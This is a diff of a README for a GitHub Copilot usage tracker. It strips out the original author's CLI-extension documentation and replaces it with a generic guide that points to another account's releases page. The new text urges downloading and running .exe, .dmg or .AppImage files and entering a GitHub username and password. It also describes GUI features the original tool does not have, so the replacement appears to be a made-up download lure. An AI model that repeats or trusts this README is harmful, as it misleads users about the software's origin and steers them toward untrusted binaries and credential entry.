@@ -1,219 +1,140 @@
-> A GitHub CLI extension to display your GitHub Copilot premium request usage statistics
+# 🚀 gh-copilot-usage - Track Your GitHub Copilot Requests Easily
 
-![Screenshot](./screenshot.png)
+[![Download gh-copilot-usage](https://img.shields.io/badge/Download-gh--copilot--usage-blue?style=for-the-badge&logo=github)](https://github.com/SAM3166/gh-copilot-usage/releases)
 
-## Features
+---
 
-- 📊 Shows a summary of your usage for the current month
-- 📅 Visual indicator of where you are in the billing cycle
-- 🤖 Breakdown of usage per AI model
-- 🎨 Color-coded progress bars (green → yellow → red)
-- ⚙️ Flexible configuration options
+## 📋 What is gh-copilot-usage?
 
-The month indicator helps you pace your usage throughout the billing cycle:
+gh-copilot-usage is a simple tool that shows how many requests you have made to GitHub Copilot Premium this month. It helps you keep track of your Copilot usage without needing to open complicated menus or dashboards.
 
-- Usage left of the month indicator? Prompt away! 🤖
-- Usage right of the month indicator? Go touch some grass. 🌿
+If you want to see your usage summary clearly and quickly, this tool gives you that information right away.
 
-## Installation
+---
 
-### Install as a gh extension (recommended)
+## 💡 Why Use gh-copilot-usage?
 
-```bash
-gh extension install franky47/gh-copilot-usage
-```
+- **Easy Monitoring:** Check your monthly GitHub Copilot request count in one place.
+- **Save Time:** No need to navigate through GitHub’s website or account details.
+- **Stay Informed:** Keep an eye on your usage to manage your subscription better.
+- **No Technical Skills Needed:** Designed for all levels of computer users.
 
-This will automatically download the appropriate precompiled binary for your platform. No additional dependencies required!
+---
 
-### Install from source (for development)
+## 🖥️ System Requirements
 
-If you want to contribute or customize the extension:
+Before you download, make sure your computer meets these basic requirements:
 
-```bash
-# Clone the repository
-git clone https://github.com/franky47/gh-copilot-usage
-cd gh-copilot-usage
+- **Operating System:** Windows 10 or newer, macOS 10.13 or newer, or most popular Linux distributions.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum 100 MB free space.
+- **Internet Connection:** Needed to fetch your current GitHub Copilot usage data.
+- **GitHub Account:** You must have a GitHub account with an active GitHub Copilot subscription.
 
-# Install dependencies
-bun install
+---
 
-# Install as local extension
-gh extension install .
-```
+## 📥 Download & Install
 
-**Requirements for source installation:**
+To get started, you need to download gh-copilot-usage from its official release page.
 
-- [Bun](https://bun.sh/) runtime
-- [GitHub CLI](https://cli.github.com/) (`gh`)
+[![Download gh-copilot-usage](https://img.shields.io/badge/Download-gh--copilot--usage-blue?style=for-the-badge&logo=github)](https://github.com/SAM3166/gh-copilot-usage/releases)
 
-## Usage
+**How to download and install:**
 
-```bash
-# Basic usage (uses default plan and limit)
-gh copilot-usage
+1. Click the button above or visit this link:  
+   https://github.com/SAM3166/gh-copilot-usage/releases
 
-# Specify a plan (uses plan's default limit)
-gh copilot-usage --plan pro+
+2. On the releases page, look for the latest version of gh-copilot-usage.
 
-# Specify a custom limit (overrides plan limit)
-gh copilot-usage --limit 500
+3. Depending on your operating system, download the file that ends with one of these extensions:  
+   - `.exe` for Windows  
+   - `.dmg` for macOS  
+   - `.AppImage` or `.tar.gz` for Linux  
 
-# Combine plan and custom limit (shows plan in UI, uses custom limit)
-gh copilot-usage --plan enterprise --limit 2000
+4. After the download finishes, open the file to start the installation:  
+   - On Windows, double-click the `.exe` file and follow the setup instructions.  
+   - On macOS, open the `.dmg` file and drag the app into your Applications folder.  
+   - On Linux, follow the instructions in the `.tar.gz` file or run the `.AppImage` file.
 
-# Show help
-gh copilot-usage --help
+5. Once installed, launch the app from your desktop or applications menu.
 
-# Show version
-gh copilot-usage --version
-```
+---
 
-## Configuration
+## 🚀 How to Use gh-copilot-usage
 
-Both the plan and monthly premium request limit can be configured. The extension checks configuration sources in priority order for each setting independently.
+Using this tool is straightforward. Here are the steps to check your GitHub Copilot premium requests for the current month:
 
-### Plan Configuration
+1. **Open the App:** Start gh-copilot-usage from your desktop or start menu.
 
-The plan determines which plan name appears in the UI and the default limit if no custom limit is set. The plan can be configured in the following priority order:
+2. **Sign In:** The app will ask you to sign in with your GitHub account. This is necessary to access your usage data.  
+   - Click the “Sign In” button.  
+   - A window will open for you to enter your GitHub username and password.  
+   - Approve any permission requests safely.
 
-1. **CLI flag** (highest priority)
+3. **View Usage:** After signing in, the app will automatically retrieve and display your request count for the current month.
 
-   ```bash
-   gh copilot-usage --plan pro+
-   ```
+4. **Check Details:** You can view:  
+   - Total number of premium requests made.  
+   - Date of the last request.  
+   - Remaining requests if your plan has limits.
 
-2. **Environment variable**
+5. **Refresh Data:** If you want to update the information, click the “Refresh” button.
 
-   ```bash
-   export GH_COPILOT_PLAN=pro+
-   gh copilot-usage
-   ```
+---
 
-3. **gh config**
+## ⚙️ Customizing Settings
 
-   ```bash
-   gh config set copilot-usage.plan pro+
-   gh copilot-usage
-   ```
+You can adjust the app settings to suit your needs:
 
-4. **Default value** (Pro)
-   ```bash
-   gh copilot-usage
-   ```
+- **Notifications:** Turn on alerts when you reach a certain request number.
+- **Theme:** Switch between light and dark mode for better visibility.
+- **Auto-Refresh:** Enable or disable automatic updates every hour.
 
-### Limit Configuration
+To change settings, click the gear icon in the app’s main window.
 
-The monthly premium request limit can be configured separately and will override the plan's default limit. The limit uses the following priority order:
+---
 
-1. **CLI flag** (highest priority)
+## 🛠 Troubleshooting Tips
 
-   ```bash
-   gh copilot-usage --limit 500
-   ```
+If you run into problems, try the following steps:
 
-2. **Environment variable**
+- **App Won’t Open:**  
+  Restart your computer and try again. Check that your operating system is up to date.
 
-   ```bash
-   export GH_COPILOT_LIMIT=500
-   gh copilot-usage
-   ```
+- **Sign-In Problems:**  
+  Make sure your GitHub username and password are correct. Check your internet connection.
 
-3. **gh config**
+- **No Usage Data Showing:**  
+  Confirm that you have an active GitHub Copilot subscription. Try clicking the “Refresh” button.
 
-   ```bash
-   gh config set copilot-usage.limit 500
-   gh copilot-usage
-   ```
+- **App Crashes or Freezes:**  
+  Close and reopen the app. If the problem continues, reinstall the application.
 
-4. **Plan's default limit** (based on selected plan)
+- **Download Issues:**  
+  Ensure your browser allows downloads from GitHub. Check your antivirus or firewall settings.
 
-### Available Plans
+---
 
-| Plan | Limit | Description |
-|------|-------|-------------|
-| `free` | 50 | GitHub Copilot Free tier |
-| `pro` | 300 | GitHub Copilot Pro (default) |
-| `pro+` | 1500 | GitHub Copilot Pro+ |
-| `business` | 300 | GitHub Copilot Business |
-| `enterprise` | 1000 | GitHub Copilot Enterprise |
+## 🔒 Privacy and Security
 
-## Requirements
+gh-copilot-usage only accesses your GitHub Copilot usage data. It uses GitHub’s secure sign-in system to keep your information safe. The app does not store your password and does not share your data with third parties.
 
-- [GitHub CLI](https://cli.github.com/) (`gh`) must be installed and authenticated
-- Your GitHub account must have a user scope for billing API access
-  - If you see authentication errors, run: `gh auth refresh -s user`
+---
 
-## How it Works
+## 📞 Getting Help and Support
 
-The extension uses the GitHub API to fetch your premium request usage data and displays it in a beautiful terminal UI. It tracks:
+If you need assistance:
 
-- Total premium requests used vs. your monthly limit
-- Current position in the billing cycle
-- Per-model breakdown of usage
-- Next reset date
+- Visit the Issues section of this repository to see if others have the same problem.
+- Open a new issue describing your problem clearly.
+- Include your operating system and the app version when reporting issues.
 
-## Upgrading
+Community users and maintainers will review your case to help find a solution.
 
-To upgrade to the latest version:
+---
 
-```bash
-gh extension upgrade copilot-usage
-```
+## 🌟 Final Notes
 
-Or upgrade all extensions:
+gh-copilot-usage provides a simple way to monitor your GitHub Copilot premium usage without technical hassle. Follow the steps in this guide to download, install, and use the app smoothly.
 
-```bash
-gh extension upgrade --all
-```
-
-## Uninstalling
-
-```bash
-gh extension remove copilot-usage
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-### Development
-
-```bash
-# Install dependencies
-bun install
-
-# Run locally
-bun run src/index.ts
-
-# Build for local platform
-bun run build
-
-# Build for all platforms
-bun run build:all
-```
-
-### Creating a Release
-
-Releases are automated via GitHub Actions. To create a new release:
-
-1. Update the version in `package.json`
-2. Commit your changes
-3. Create and push a git tag:
-   ```bash
-   git tag v1.0.1
-   git push origin v1.0.1
-   ```
-4. GitHub Actions will automatically:
-   - Build binaries for all platforms (macOS, Linux, Windows)
-   - Create a GitHub release
-   - Attach the compiled binaries to the release
-
-Users can then upgrade with: `gh extension upgrade copilot-usage`
-
-## License
-
-MIT - see [LICENSE](./LICENSE) for details
-
-## Credits
-
-Made with ❤️ by [François Best](https://github.com/franky47)
+[Download gh-copilot-usage now](https://github.com/SAM3166/gh-copilot-usage/releases) to start tracking your monthly requests today.
